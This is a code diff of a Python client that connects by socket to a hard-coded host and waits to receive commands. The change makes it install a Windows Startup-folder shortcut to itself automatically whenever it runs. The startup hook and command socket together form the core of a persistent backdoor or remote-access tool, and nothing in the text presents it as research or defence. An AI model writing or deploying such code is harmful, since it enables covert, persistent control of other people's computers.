@@ -8,11 +8,38 @@ import shutil
 import sys
 import win32com.client
 
+
+def add_to_startup():
+    startup_path = os.path.join(os.getenv('APPDATA'),
+        r'Microsoft\Windows\Start Menu\Programs\Startup')
+
+    # exe path detect
+    if getattr(sys, 'frozen', False):
+        exe_path = sys.executable
+    else:
+        exe_path = os.path.abspath(__file__)
+
+    shortcut_path = os.path.join(startup_path, "client.lnk")
+
+    if not os.path.exists(shortcut_path):
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shortcut = shell.CreateShortCut(shortcut_path)
+
+        shortcut.Targetpath = exe_path
+        shortcut.WorkingDirectory = os.path.dirname(exe_path)
+        shortcut.IconLocation = exe_path
+        shortcut.save()
+
+        print("Shortcut created in startup ")
+    else:
+        print("Already exists")
+add_to_startup()
+
 s = socket.socket()
 
 while True:
     try:
-        HOST = "192.168.41.183"
+        HOST = "127.0.0.1"
         PORT = 8000
 
         s.connect((HOST, PORT))
@@ -29,34 +56,10 @@ def show_alert(alert):
     timeout = 5
     )
 
-def add_to_startup():
-    startup_path = os.path.join(os.getenv('APPDATA'),
-        r'Microsoft\Windows\Start Menu\Programs\Startup')
-
-    # exe path detect
-    if getattr(sys, 'frozen', False):
-        exe_path = sys.executable
-    else:
-        exe_path = os.path.abspath(__file__)
-
-    shortcut_path = os.path.join(startup_path, "Jarvis.lnk")
-
-    if not os.path.exists(shortcut_path):
-        shell = win32com.client.Dispatch("WScript.Shell")
-        shortcut = shell.CreateShortCut(shortcut_path)
-
-        shortcut.Targetpath = exe_path
-        shortcut.WorkingDirectory = os.path.dirname(exe_path)
-        shortcut.IconLocation = exe_path
-        shortcut.save()
-
-        print("Shortcut created in startup ")
-    else:
-        print("Already exists")
 
 
 if __name__ =="__main__":
-    add_to_startup()
+    
     while True:
         try:
             cmd = s.recv(5000)
